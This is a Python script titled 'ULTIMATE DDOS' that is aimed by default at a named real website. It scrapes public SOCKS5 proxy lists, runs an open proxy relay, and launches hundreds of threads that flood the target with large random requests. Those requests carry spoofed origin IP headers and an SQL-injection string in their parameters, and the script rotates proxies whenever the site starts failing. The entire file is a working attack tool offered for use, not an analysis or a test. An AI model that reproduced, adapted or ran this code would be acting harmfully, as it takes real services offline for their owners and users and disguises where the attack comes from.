#!/usr/bin/env python3
import socket
import struct
import threading
import time
import random
import requests
import gzip
import json
import base64
import hashlib
import os
import sys
from urllib.parse import urlencode, quote_plus
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==================== CONFIG ====================
TARGET = os.environ.get('TARGET', 'https://skillclash.site')
THREADS = int(os.environ.get('THREADS', 600))
PROXY_PORT = 8872
PROXY_FILE = 'proxies.txt'

# ==================== PROXY FETCHER ====================
def fetch_proxies():
    sources = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/socks5.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&protocols=socks5'
    ]
    all_proxies = []
    for url in sources:
        try:
            r = requests.get(url, timeout=5)
            lines = r.text.splitlines()
            all_proxies.extend([l.strip() for l in lines if l.strip()])
        except:
            pass
    # Dedup & validate
    all_proxies = list(set(all_proxies))
    valid = [p for p in all_proxies if ':' in p and len(p.split(':')) == 2]
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(valid))
    print(f'✅ {len(valid)} proxies updated')
    return valid

def auto_refresh_proxies():
    while True:
        try:
            fetch_proxies()
        except:
            pass
        time.sleep(30)

# ==================== SOCKS5 PROXY SERVER ====================
def handle_socks5_client(client_socket):
    try:
        # Auth handshake
        data = client_socket.recv(2)
        if not data or data[0] != 0x05:
            client_socket.close()
            return
        client_socket.sendall(b'\x05\x00')
        
        # Request
        data = client_socket.recv(4)
        if len(data) < 4:
            client_socket.close()
            return
        if data[1] != 0x01:
            client_socket.close()
            return
        
        addr_type = data[3]
        if addr_type == 0x01:  # IPv4
            addr = socket.inet_ntoa(client_socket.recv(4))
            port = struct.unpack('>H', client_socket.recv(2))[0]
        elif addr_type == 0x03:  # Domain
            domain_len = client_socket.recv(1)[0]
            domain = client_socket.recv(domain_len).decode()
            port = struct.unpack('>H', client_socket.recv(2))[0]
            addr = socket.gethostbyname(domain)
        else:
            client_socket.close()
            return
        
        # Connect to target
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((addr, port))
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton(addr) + struct.pack('>H', port))
        
        # Bidirectional pipe
        def pipe(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except:
                pass
            finally:
                src.close()
                dst.close()
        
        threading.Thread(target=pipe, args=(client_socket, remote), daemon=True).start()
        threading.Thread(target=pipe, args=(remote, client_socket), daemon=True).start()
        
    except:
        client_socket.close()

def start_proxy_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(500)
    print(f'🔥 SOCKS5 proxy live on 0.0.0.0:{PROXY_PORT}')
    while True:
        client, _ = server.accept()
        threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()

# ==================== PAYLOAD GENERATORS ====================
def generate_payload():
    t = random.choice(['json', 'xml', 'form', 'binary', 'compressed'])
    if t == 'json':
        return {'data': {'id': random.randint(1,999999), 'payload': 'A'*random.randint(100,5000)}}
    elif t == 'xml':
        return f'<root><id>{random.randint(1,999999)}</id><data>{"X"*random.randint(500,5000)}</data></root>'
    elif t == 'form':
        return {f'f{i}': 'Z'*random.randint(100,1000) for i in range(random.randint(20,100))}
    elif t == 'binary':
        return bytes([random.randint(0,255) for _ in range(random.randint(1000,10000))])
    else:  # compressed
        return gzip.compress(json.dumps({'x': 'X'*random.randint(5000,20000)}).encode())

def generate_headers():
    return {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/124.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Safari/605.1.15'
        ]),
        'Accept': random.choice(['application/json,*/*', 'text/html,*/*', 'application/xml,*/*']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'Referer': random.choice([TARGET, 'https://google.com', 'https://bing.com']),
        'Cache-Control': 'no-cache'
    }

def generate_path():
    path = random.choice(['/api/v1/data', '/wp-admin/admin-ajax.php', '/index.php', '/login', '/search'])
    params = {
        'id': random.randint(1,999999),
        'page': random.randint(1,1000),
        'cb': str(random.randint(100000,999999)),
        'sql': f"{random.randint(1,100)}' OR '1'='1"
    }
    return path + '?' + urlencode(params)

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ==================== FLOOD ENGINE ====================
def flood_worker():
    sess = requests.Session()
    retries = Retry(total=0, backoff_factor=0)
    sess.mount('http://', HTTPAdapter(max_retries=retries))
    sess.mount('https://', HTTPAdapter(max_retries=retries))
    
    while True:
        try:
            proxies = load_proxies()
            if proxies:
                proxy = random.choice(proxies)
                sess.proxies = {
                    'http': f'socks5://{proxy}',
                    'https': f'socks5://{proxy}'
                }
            
            url = TARGET + generate_path()
            headers = generate_headers()
            payload = generate_payload()
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
            
            if method in ['GET', 'DELETE']:
                r = sess.request(method, url, headers=headers, timeout=2)
            else:
                if isinstance(payload, dict):
                    r = sess.request(method, url, headers=headers, json=payload, timeout=2)
                else:
                    r = sess.request(method, url, headers=headers, data=payload, timeout=2)
            
            if r.status_code in [403, 429, 500, 502, 503]:
                sess.proxies = {'http': f'socks5://{random.choice(proxies)}', 'https': f'socks5://{random.choice(proxies)}'}
                sess.post(url, headers=headers, data=gzip.compress(b'force'), timeout=2)
            
            time.sleep(random.uniform(0.0001, 0.005))
        except:
            pass

# ==================== MAIN ====================
if __name__ == '__main__':
    print('💀 DEVILS WILL RISE – ULTIMATE DDOS 💀')
    print(f'🎯 Target: {TARGET}')
    print(f'🧵 Threads: {THREADS}')
    print(f'🔥 Proxy port: {PROXY_PORT}')
    
    # Start proxy fetcher
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    # Start proxy server
    threading.Thread(target=start_proxy_server, daemon=True).start()
    
    # Wait for proxies
    time.sleep(3)
    
    # Launch flood threads
    for _ in range(THREADS):
        threading.Thread(target=flood_worker, daemon=True).start()
    
    # Keep alive
    try:
        while True:
            time.sleep(60)
            print(f'💀 Active threads: {threading.active_count()}')
    except KeyboardInterrupt:
        print('🛑 Shutting down...')
        sys.exit(0)
